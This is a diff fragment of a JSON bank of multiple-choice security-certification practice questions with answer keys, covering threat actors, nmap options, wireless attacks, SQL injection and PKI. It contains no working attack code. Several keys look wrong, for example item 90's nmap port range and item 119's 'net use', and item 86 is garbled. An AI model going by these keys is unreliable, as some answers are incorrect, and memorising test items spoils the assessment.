+    "q": "An military defense contracting company has hired your company to conduct a penetration test against their networks. Their company has a strong vulnerability management program in place, but they are concerned that they may still be subject to remote hackers’ intrusion. They have asked your company to create a red team with their most skilled hackers and conduct a long-term engagement over 6-12 months. The goal of this assessment is to simulate an attacking group that uses stealth while infiltrating the network, quietly maintaining persistence, and slowly exfiltrating data out of the network over time to determine if the cybersecurity analysts could detect this type of threat. Which of the following type of threat actors will your red team need to emulate",
+    "choices": [
+      "Script Kiddies",
+      "Hacktivists",
+      "Insider threat",
+      "APT"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 73,
+    "q": "Which command-line tool could you use on a Windows system to enable an inactive administrator account",
+    "choices": [
+      "net user",
+      "gpresult",
+      "taskkill",
+      "robocopy"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 74,
+    "q": "Which of the following ports is used by the Service Location Protocol when organizing and locating printers, databases, and other resources in a network",
+    "choices": [
+      "389",
+      "427",
+      "443",
+      "445"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 75,
+    "q": "Which of the following will an adversary do during the reconnaissance phase of the Lockheed Martin kill chain? (SELECT THREE)",
+    "choices": [
+      "Select backdoor implants and appropriate command and control mechanisms",
+      "Harvest email addresses",
+      "Release of malware on USB drives",
+      "Acquire or develop zero-day exploits",
+      "Identify employees on Social Media networks",
+      "Discover servers facing the public internet"
+    ],
+    "correct": [
+      1,
+      4,
+      5
+    ],
+    "multi": true,
+    "source": "trainer"
+  },
+  {
+    "id": 76,
+    "q": "Which of the following commands can be used to resolve a DNS name to an IP address",
+    "choices": [
+      "iplookup",
+      "query",
+      "dns",
+      "nslookup"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 77,
+    "q": "What type of wireless security measure can easily be defeated by a hacker by spoofing their network interface card’s hardware address",
+    "choices": [
+      "WPS",
+      "Disable SSID broadcast",
+      "WEP",
+      "MAC filtering"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 78,
+    "q": "Your company’s Security Operations Center (SOC) is currently detecting an ongoing DDoS attack against your network’s file server. A cybersecurity analyst has identified forty internal workstations on the network conducting the attack against your network’s file server. The cybersecurity analyst believes these internal workstations are infected with malware and places them into a quarantined network area. The analyst then contacts a service desk ticket to have the workstations scanned and cleaned of the infection. What type of malware was the workstation likely a victim of based on the scenario provided",
+    "choices": [
+      "Botnet",
+      "Ransomware",
+      "Spyware",
+      "Rootkit"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 79,
+    "q": "You work for a bank interested in moving some of its operations to the cloud, but it is worried about security. You recently discovered an organization called CloudBank that was formed by 15 local banks as a way for them to build a secure cloud-based environment that can be accessed by the 15 member banks. Which cloud model BEST describes the cloud created by CloudBank",
+    "choices": [
+      "Public cloud",
+      "Community cloud",
+      "Hybrid cloud",
+      "Private cloud"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 80,
+    "q": "What technology is NOT PKI x.509 compliant and cannot be used in various secure functions",
+    "choices": [
+      "AES",
+      "PKCS",
+      "Blowfish",
+      "SSL/TLS"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 81,
+    "q": "A network technician is responsible for the basic security of the network. Management has asked if there is a way to improve the level of access users have to the company file server. Right now, any employee can upload and download files with basic system authentication (username and password). What should he configure to increase security",
+    "choices": [
+      "MDS authentication",
+      "Multi-factor authentication",
+      "Kerberos authentication",
+      "Single-sign on authentication"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 82,
+    "q": "A firewall administrator has configured a new DMZ to allow public systems to be segmented from the organization’s internal network. The firewall now has three security zones: untrusted (Internet) 143.27.43.0/24, DMZ 161.212.71.0/24, trusted (intranet) 10.10.0.0/24. The firewall administrator has been asked to enable remote desktop access from a fixed IP on the remote network to a remote desktop server in the DMZ for the Chief Security Officer who works from home office after hours. The CSO’s home internet uses a static IP of 143.27.43.32. The remote desktop service is assigned a public-facing IP of 161.212.71.14. What rule should the administrator add to the firewall",
+    "choices": [
+      "Permit 143.27.43.32 161.212.71.14 RDP 3389",
+      "Permit 143.27.43.0/24 161.212.71.14 RDP 3389",
+      "Permit 143.27.43.0/24 161.212.71.0/24 RDP 3389",
+      "Permit 143.27.43.32 161.212.71.0/24 RDP 3389"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 83,
+    "q": "Which of the following techniques would be the most appropriate solution to implementing a multi-factor authentication system",
+    "choices": [
+      "Smartcard and PIN",
+      "Username and password",
+      "Fingerprint and retinal scan",
+      "Password and security question"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 84,
+    "q": "Which of the following vulnerabilities involves leveraging access from a single virtual machine to other machines on a hypervisor",
+    "choices": [
+      "VM sprawl",
+      "VM escape",
+      "VM data remnant",
+      "VM migration"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 85,
+    "q": "Your company recently suffered a small data breach caused by an employee emailing himself a copy of the current customer’s names, account numbers, and credit card limits. You are determined that something like this will never happen again. Which of the following logical security concepts should you implement to prevent a trusted insider from stealing your corporate data",
+    "choices": [
+      "Strong passwords",
+      "MDM",
+      "DLP",
+      "Firewall"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 86,
+    "q": "You just received an email from Bob, your investment banker, stating that he completed the wire transfer of $10,000 to your bank account in Vietnam. The problem is, you do not have a bank account in Vietnam, so you immediately call Bob to ask what happened. Bob explains that he received an email from you requesting the transfer. You insist you never sent that email to Bob initiating this wire transfer. What aspect of PKI could be used to BEST ensure Bob is under attack by a sender actually sent a particular email message and avoid this type of situation",
+    "choices": [
+      "Recovery agents",
+      "CRL",
+      "Non-repudiation",
+      "Trust models"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 87,
+    "q": "Tim, a help desk technician, receives a call from a frantic executive who states that their company-issued smartphone was stolen during their lunch meeting with a rival company executive. Tim quickly checks the MDM administration tool and identifies that the user’s smartphone is still communicating with the MDM and displays its location on a map. What should Tim do next to ensure the stolen device’s data remains confidential and inaccessible to the thief",
+    "choices": [
+      "Reset the device’s password",
+      "Promptly encrypt the device",
+      "Perform a remote wipe of the device",
+      "Identify the IP address of the smartphone"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 88,
+    "q": "You are currently working as a firewall technician. You have received a request to open up a few ports on the firewall to allow a newly VoIP system to operate properly. The installer has requested that the ports associated with SIP, RDP, H.323, and RTP be opened to allow the new system to operate properly. Which of these ports are NOT used by a typical VoIP system",
+    "choices": [
+      "SIP",
+      "H.323",
+      "RDP",
+      "RTP"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 89,
+    "q": "A cybersecurity analyst just finished conducting an initial vulnerability scan and is reviewing their results. To avoid wasting time on results that are not really a vulnerability, the analyst wants to remove any false positives before remediating the findings. Which of the following is an indicator that something in their results could be a false positive",
+    "choices": [
+      "A scan result showing a version that is different from the automated asset inventory",
+      "A finding that shows the scanner compliance plugins are not up-to-date",
+      "A HTTPS entry that indicates the web page is securely encrypted",
+      "Items classified by the system as Low or for Informational Purposes Only"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 90,
+    "q": "Which of the following nmap commands should be utilized by a penetration tester that wants to scan every TCP registered port with fingerprinting, service, and operating system detection on a Class B network that is blocking ICMP",
+    "choices": [
+      "nmap -Pn -O -sS -p 1-65535 172.16.1.0/8",
+      "nmap -Pn -A -sT -p 0-65535 172.16.1.0/24",
+      "nmap -Pn -sS -p 1-1024 -sS 172.16.1.0/16",
+      "nmap -Pn -A -O -p 1-1024 -sS 172.16.1.0/16"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 91,
+    "q": "Windows file servers commonly hold sensitive files, databases, passwords, and more. What common vulnerability is usually used against a Windows file server to expose sensitive files, databases, and passwords",
+    "choices": [
+      "CRLF Injection",
+      "SQL Injection",
+      "Missing patches",
+      "Cross-site scripting"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 92,
+    "q": "David noticed that port 3389 was open on one of the POS terminals in a store during a scheduled PCI compliance scan. Based on the scan results, what service should he expect to find enabled on this terminal",
+    "choices": [
+      "RDP",
+      "LDAP",
+      "IMAP",
+      "MySQL"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 93,
+    "q": "What SCAP component provides a list of entries that contain an identification number, a description, and a public reference for each publicly known weakness in a piece of software",
+    "choices": [
+      "CVE",
+      "XCCDF",
+      "CPE",
+      "CCE"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 94,
+    "q": "You want to provide controlled remote access to the remote administration interfaces of multiple servers hosted on a private cloud. What type of segmentation security solution is the best choice for this scenario",
+    "choices": [
+      "Physical",
+      "Bastion hosts",
+      "Airgap",
+      "Jumpbox"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 95,
+    "q": "Your organization’s primary operating system vendor just released a critical patch for your servers. Your system administrators have recently deployed this patch and verified the installation was successful. This critical patch was designed to remediate a vulnerability that can allow a malicious actor to execute code on the server over the Internet remotely. You ran a vulnerability scan of the network and determined that all servers are still being reported as having the vulnerability. You verified all your scan configurations are correct. Which of the following might be the reason that the scan report still shows the servers as vulnerable? (SELECT ALL THAT APPLY)",
+    "choices": [
+      "The wrong IP address range was scanned during your vulnerability assessment.",
+      "You conducted the vulnerability scan without rebooting long after the patch was installed.",
+      "The critical patch did not remediate the vulnerability.",
+      "The vulnerability assessment scan is returning a false positive."
+    ],
+    "correct": [
+      2,
+      3
+    ],
+    "multi": true,
+    "source": "trainer"
+  },
+  {
+    "id": 96,
+    "q": "Which of the following is a special type of embedded operating system that uses a predictable and consistent scheduler",
+    "choices": [
+      "IoT",
+      "Mobile",
+      "RTOS",
+      "POS"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 97,
+    "q": "You are performing a web application security test, notice that the site is dynamic, and must be using a backend database. You decide you want to determine if the site is susceptible to a SQL injection. What is the first character that you should attempt to use in breaking a valid SQL request",
+    "choices": [
+      "Single quote",
+      "Exclamation mark",
+      "Double quote",
+      "Semicolon"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 98,
+    "q": "You are conducting a static analysis of an application’s source code and see the following:\n(String) page += \"\";\nBased on this code snippet, which of the following security flaws exists in this application",
+    "choices": [
+      "Insufficient logging and monitoring",
+      "Race condition",
+      "Improper error handling",
+      "Improper input validation"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 99,
+    "q": "Sarah is working at a startup that is focused on making secure banking apps for smartphones. Her company needs to select an asymmetric encryption algorithm to encrypt the data being used by the app. Due to the need for high security of the banking data, the company needs to ensure that whatever encryption they use is considered strong, but also needs to minimize the processing power required since it will be running on a mobile device with lower computing power. Which algorithm should Sarah choose to provide the same level of high encryption strength with a lower overall key length",
+    "choices": [
+      "ECC",
+      "Twofish",
+      "Diffie-Hellman",
+      "RSA"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 100,
+    "q": "What is the proper threat classification for a security breach that employs brute-force methods to compromise, degrade, or destroy systems",
+    "choices": [
+      "Attrition",
+      "Impersonation",
+      "Improper usage",
+      "Loss or theft of equipment"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 101,
+    "q": "A vulnerability scanner has reported that a vulnerability exists in the system. Upon validating the report, the analyst determines that the reported vulnerability does not exist on the system. What is the proper term for this situation",
+    "choices": [
+      "True positive",
+      "True negative",
+      "False negative",
+      "False positive"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 102,
+    "q": "Your network is currently under attack from multiple hosts outside of the network. Which type of attack is most likely occurring",
+    "choices": [
+      "Spoofing",
+      "DoS",
+      "DDoS",
+      "Wardriving"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 103,
+    "q": "Which of the following techniques listed below are not appropriate to use during a passive reconnaissance exercise against a specific target company",
+    "choices": [
+      "WHOIS lookups",
+      "Banner grabbing",
+      "BGP looking glass usage",
+      "Registrar checks"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 104,
+    "q": "A software developer has just finished writing a new application. You have been contracted to conduct a scan to determine what vulnerabilities may exist. The developer provides you with the source code and the binary for the application. Which of the following should you perform FIRST",
+    "choices": [
+      "Vulnerability scan",
+      "Dynamic application scan",
+      "Compliance scan",
+      "Static application scan"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 105,
+    "q": "You are conducting a wireless penetration test against an organization. During your reconnaissance, you discover that their network is known as “BigCorpWireless” has its SSID broadcast is enabled. You configure your laptop to respond to broadcasts for connection to “BigCorpWireless” and park at the far end of the parking lot. At the end of the workday, as people get in their cars in the parking lot, you see numerous smartphones connecting to your laptop over WiFi. Which of the following exploit did you utilize",
+    "choices": [
+      "Fragmentation attack",
+      "Karma attack",
+      "Downgrade attack",
+      "Deauthentication attack"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 106,
+    "q": "What is the BEST explanation for why consumer-based IoT devices are less secure than traditional desktops and servers?",
+    "choices": [
+      "IoT devices focus convenience more than security",
+      "IoT devices are unable to receive patches and updates",
+      "IoT devices are only used in low security use cases",
+      "IoT devices are not powerful enough to support encryption"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 107,
+    "q": "Which of the following vulnerabilities is the greatest threat to data confidentiality",
+    "choices": [
+      "Web application SQL injection vulnerability",
+      "HTTP TRACE/TRACK methods enabled",
+      "SSL Server with SSLv3 enabled vulnerability",
+      "phpinfo information disclosure vulnerability"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 108,
+    "q": "A cybersecurity analyst received an alert that sensors continuously observe well-known call home messages at their network boundary. Still, the organization’s proxy firewall is properly configured to successfully drop the messages before leaving the network. Which of the following is MOST likely the cause of the call home messages being sent",
+    "choices": [
+      "An attacker is performing reconnaissance on the organization’s workstations",
+      "An infected workstation is attempting to reach a command and control server",
+      "A malicious insider is trying to exfiltrate information to a remote network",
+      "Malware is running on a company workstation or server"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 109,
+    "q": "You have noticed some unusual network traffic outbound from a certain host. The host is communicating with a known malicious server over port 443 using an encrypted TLS tunnel. You ran a full system antivirus scan of the host with an updated antivirus signature file, but the antivirus did not find any infection signs. Which of the following has MOST likely occurred",
+    "choices": [
+      "Directory traversal",
+      "Zero-day attack",
+      "Password spraying",
+      "Session hijacking"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 110,
+    "q": "Which technique would provide the largest increase in security on a network with ICS, SCADA, or IoT devices",
+    "choices": [
+      "User and entity behavior analytics",
+      "Use of a host-based IDS or IPS",
+      "Installation of anti-virus tools",
+      "Implement endpoint protection platforms"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 111,
+    "q": "What method might a system administrator use to replicate the DNS information from one DNS server to another, but could also be used maliciously by an attacker",
+    "choices": [
+      "Zone transfers",
+      "DNSSEC",
+      "CNAME",
+      "DNS registration"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 112,
+    "q": "You are conducting a wireless penetration test against an organization. You have been monitoring the WPA2 encrypted network for almost an hour but have been unable to successfully capture handshakes. Which of the following exploits should you use to increase your chances of capturing a handshake",
+    "choices": [
+      "Fragmentation attack",
+      "Downgrade attack",
+      "Deauthentication attack",
+      "Karma attack"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 113,
+    "q": "A project lead reviews the statement of work for an upcoming project that is focused on identifying potential weaknesses in the organization’s internal and external network infrastructure. As part of the project, a team of external contractors will attempt to employ various attacks against the organization. The work statement specifically addresses the evaluation of an external tool to probe internal resources in an attempt to develop logical diagrams indicating weaknesses in the infrastructure. Based on this scope of work, what type of activity is to be performed",
+    "choices": [
+      "Session hijacking",
+      "Vulnerability scanning",
+      "Social engineering",
+      "Penetration testing"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 114,
+    "q": "You have been tasked to create some baseline system images to remediate vulnerabilities found in different operating systems. Before any of the images can be deployed, they must be scanned for malware and vulnerabilities. You must ensure the configurations meet industry-standard benchmarks and that the baselining creation process can be repeated frequently. What vulnerability option will BEST create the process requirements to meet the industry-standard benchmarks",
+    "choices": [
+      "Utilizing an operating system SCAP plugin",
+      "Utilizing an automated credential scan",
+      "Utilizing a known malware plugin",
+      "Utilizing a non-credentialed scan"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 115,
+    "q": "A pentester is trying to map the organization’s internal network. The analyst writes the following command \"nmap -n -sS -T4 -p 80 10.0.3.0/24\" What type of scan is this",
+    "choices": [
+      "Stealth Scan",
+      "Quick Scan",
+      "Intense Scan",
+      "Comprehensive Scan"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 116,
+    "q": "During your reconnaissance, you have determined that your client has devices used to send remote control signals to industrial assets, usually their critical infrastructure utilities connected to their corporate network. Which of the following methods would MOST likely be the best method for exploiting these systems",
+    "choices": [
+      "Use Metasploit modules designed to target the SCADA systems",
+      "Use social engineering to trick a user into opening a malicious APK",
+      "Use a spearphishing campaign to trick a user into installing a RAT",
+      "Identify a phone/device for easy exploitation"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 117,
+    "q": "You conducted a security scan and found that port 389 is being used when connecting to LDAP for user authentication instead of port 636. The security scanning software recommends that you remediate this by changing user authentication to port 636 whenever possible. What should you do",
+    "choices": [
+      "Conduct remediation action to update encryption keys on each server to mark port 636",
+      "Mark this as a false positive in your audit report since the servers that typically run on port 389 and 636 are identical",
+      "Change all devices and servers that support to port 636 since port 389 is a reserved port that requires root access and can expose the server to privilege escalation attacks",
+      "Change all devices and servers that support to port 636 since encrypted services run by default on port 636"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 118,
+    "q": "You are conducting a wireless penetration test against an organization. You have identified that they are using WEP encryption on their wireless access points. You are impatient and do not want to wait to collect enough packets to find a repeated initialization vector. You decide to extract part of the key material from one of the packets and use it to send an ARP request to the AP. Which of the following exploits did you use in this attack",
+    "choices": [
+      "Karma attack",
+      "Downgrade attack",
+      "Deauthentication attack",
+      "Fragmentation attack"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 119,
+    "q": "You have been given access to a Windows system located on an Active Directory domain as part of a white box penetration test. Which of the following commands would provide information about other systems on the network",
+    "choices": [
+      "net user",
+      "net group",
+      "net use",
+      "net config"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 120,
+    "q": "A cybersecurity analyst from BigCorp contacts your company to notify them that several of your computers were seen attempting to create a denial of service condition against their servers. They believe your company has become infected with malware, and those machines were part of a larger botnet. Which of the following BEST describes your company’s infected computers",
+    "choices": [
+      "Monsters",
+      "Bugs",
+      "Zero-day",
+      "Zombie"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 121,
+    "q": "A recent threat has been announced in the cybersecurity world, stating a critical vulnerability in a particular operating system’s kernel. Unfortunately, your company has not maintained a current asset inventory, so you are unaware of how many your servers may be affected. What should you do to find all the affected servers within your network",
+    "choices": [
+      "Manually review the syslog server’s logs",
+      "Conduct an OS fingerprinting scan across the network",
+      "Conduct a service discovery scan on the network",
+      "Conduct a packet capture of data traversing the server network"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 122,
+    "q": "What nmap switch would you use to determine which UDP ports are open on a targeted network",
+    "choices": [
+      "-sP",
+      "-sS",
+      "-sU",
+      "-sN"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 123,
+    "q": "Which of the following is a DNS record type",
+    "choices": [
+      "DHCP",
+      "PTR",
+      "TTL",
+      "LDAP"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 124,
+    "q": "Your company, HackMe Incorporated, is a US-based company specializing in conducting penetration tests for large corporations. Big Corp has recently asked you to perform a penetration test of its offices in Saudi Arabia and Iran. The penetration test would include both remote attacks and an on-site USB key drop attack. Which of the following MUST you investigate BEFORE you begin to negotiate the contract for the engagement",
+    "choices": [
+      "Budget allocation to the penetration test",
+      "Support resources available to your team",
+      "Type of threat actor your team will emulate",
+      "Export restrictions that may apply to your tools"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 125,
+    "q": "Which of the following tools would you use to audit a multi-cloud environment",
+    "choices": [
+      "Prowler",
+      "ScoutSuite",
+      "Pacu",
+      "OpenVAS"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 126,
+    "q": "During your reconnaissance, you have determined that your client’s employees all use Android smartphones that connect back to the corporate network over a secure VPN connection. Which of the following methods would MOST likely be the best method for exploiting these",
+    "choices": [
+      "Use social engineering to trick a user into opening a malicious APK",
+      "Use web-based exploits against the device’s web interfaces",
+      "Identify a jailbroken device for easy exploitation",
+      "Use a tool like ICSSPLOIT  to target specific vulnerabilities"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 127,
+    "q": "A technician just completed the second phase of their scans using Firewalk and the following output was displayed on their terminal:\nTCP port 21 – no response  \nTCP port 22 – no response  \nTCP port 23 – Time-to-live exceeded  \nBased on these scan results, which of the following statements are true?",
+    "choices": [
+      "Firewall is blocking ports 21 through 23 and a service on the target is listening on port 23",
+      "A TTL response error indicates port 23 was able to make a connection to the target",
+      "No response from port 21 and 22 indicates services are not running on the target",
+      "Port 23 was not blocked at the firewall because the scan on port 23 passed through the filtering device"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 128,
+    "q": "During a security audit, you discovered that customer service employees have been emailing unencrypted confidential information to their personal email accounts via email. What technology could you employ to detect these occurrences in the future and send an automated alert to the security team",
+    "choices": [
+      "UTM",
+      "MDM",
+      "DLP",
+      "SSL"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 129,
+    "q": "Which of the following is true concerning LM hashes",
+    "choices": [
+      "LM hashes are not generated when the password length exceeds 15 characters",
+      "LM hashes consist of 48 hexadecimal characters",
+      "Uppercase characters in the password are converted to lowercase",
+      "LM hashes are based on AES128 cryptographic standard"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 130,
+    "q": "The network administrator noticed that the border router has high network capacity loading during non-working hours. This load is causing web services outages. Which of the following is the MOST likely cause of the issue",
+    "choices": [
+      "Session hijacking",
+      "Evil twin",
+      "ARP cache poisoning",
+      "Distributed DoS"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 131,
+    "q": "Which of the following provides origin authenticity through source authentication, data integrity through hash functions, and confidentiality through encryption protection for IP packets",
+    "choices": [
+      "DES",
+      "SHA",
+      "IPSEC",
+      "CRC"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 132,
+    "q": "A system administrator wants to verify that external IP addresses cannot collect software versioning from servers on the network. Which of the following should the system administrator do to confirm the network is protected",
+    "choices": [
+      "Use nmap to query known ports",
+      "Analyze packet captures",
+      "Utilize netstat to locate active connections",
+      "Review the IDS logs on the network"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 133,
+    "q": "Your company has just announced a change to an “API first” model of software development. As a cybersecurity analyst, you are immediately concerned about the possibility of an insecure deserialization vulnerability in this model. Which of the following is the primary basis for an attack against this vulnerability",
+    "choices": [
+      "Accepting serialized objects from untrusted sources or the use of serialized non-primitive data may lead to remote code execution",
+      "Insufficient logging and monitoring makes it impossible to detect when insecure deserialization vulnerabilities are exploited",
+      "Lack of input validation could allow for a SQL attack",
+      "Lack of input validation could lead to a cross-site scripting attack"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 134,
+    "q": "Which of the following hashing algorithms results in a 160-bit fixed output",
+    "choices": [
+      "NTLM",
+      "MD5",
+      "SHA-2",
+      "SHA-1"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 135,
+    "q": "Which of the following attacks would most likely be used to create an inadvertent disclosure of information from an organization's database",
+    "choices": [
+      "SQL Injection",
+      "Buffer overflow",
+      "Cross-site scripting",
+      "Denial of service"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 136,
+    "q": "Which of the following types of attacks involves changing the system's MAC address before it connects to a wireless network",
+    "choices": [
+      "Zombie",
+      "Botnet",
+      "Spoofing",
+      "DDoS"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 137,
+    "q": "Which type of threat actor can accidentally or inadvertently cause a security incident in your organization",
+    "choices": [
+      "Insider threat",
+      "APT",
+      "Organized Crime",
+      "Hacktivist"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 138,
+    "q": "You are conducting a static code analysis of a Java program. Consider the following code snippet : \nString custname = request.getParameter(\"customerName\");\nString query = \"SELECT account_balance FROM user_data WHERE user_name = ?\";\nPreparedStatement pstmt = connection.prepareStatement(query);\npstmt.setString(1, custname);\nResultSet results = pstmt.executeQuery();\nBased on the code above, what type of secure coding practice is being used",
+    "choices": [
+      "Input validation",
+      "Parameterized queries",
+      "Session management",
+      "Authentication"
+    ],
+    "correct": [
+      1
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 139,
+    "q": "A network administrator receives a call asking for assistance with connecting to the network. The person on the phone asks for the IP address, subnet mask, and VLAN needed to access the network. What type of attack might this be",
+    "choices": [
+      "Zombie attack",
+      "VLAN hopping",
+      "Spoofing",
+      "Social engineering"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 140,
+    "q": "You are reverse engineering a piece of malware recovered from a retailer's network for analysis. They found that the malicious code was extracting track data from their customers' credit cards during processing. Which of the following types of threats would you classify this malware as",
+    "choices": [
+      "Ransomware",
+      "Rootkit",
+      "POS malware",
+      "Keylogger"
+    ],
+    "correct": [
+      2
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 141,
+    "q": "Cybersecurity analysts are experiencing some issues with their vulnerability scans occurring because the previous day's scans are still running when the scanner attempts to start the current day's scans. Which of the following recommendations is LEAST likely to resolve this issue",
+    "choices": [
+      "Reduce the scope of scans",
+      "Reduce the frequency of scans",
+      "Add another vulnerability scanner",
+      "Reduce the sensitivity of scans"
+    ],
+    "correct": [
+      3
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 142,
+    "q": "An organization is currently accepting bids for a contract that will involve penetration testing and reporting. The organization is asking all bidders to provide proof of previous penetration testing and reporting experience. One contractor decides to print out a few reports from some previous penetration tests that they performed. What could have occurred as a result of this contractor's action",
+    "choices": [
+      "The contractor may have inadvertently exposed numerous vulnerabilities they had found at other companies on previous assessments",
+      "The company accepting the bid will hire the contractor because of the quality of the reports he submitted with his bid.",
+      "The contractor will have their bid accepted with a stipulatory bonus because of their excellent work on previous penetration tests",
+      "The organization accepting the bid will want to use the reports as an example of the format for all bidders to use in the future"
+    ],
+    "correct": [
+      0
+    ],
+    "multi": false,
+    "source": "trainer"
+  },
+  {
+    "id": 143,
